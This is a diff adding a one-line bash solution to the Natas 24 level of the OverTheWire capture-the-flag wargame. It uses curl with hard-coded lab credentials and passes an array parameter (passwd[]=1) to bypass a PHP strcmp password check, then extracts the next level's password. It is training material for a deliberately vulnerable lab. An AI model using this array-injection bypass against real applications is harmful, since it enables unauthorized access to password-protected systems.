@@ -1,0 +1,4 @@
+#!/bin/bash
+
+# bypass strcmp by passing array instead of string
+curl --user natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org/?passwd[]=1 -g 2>&1 | grep Password
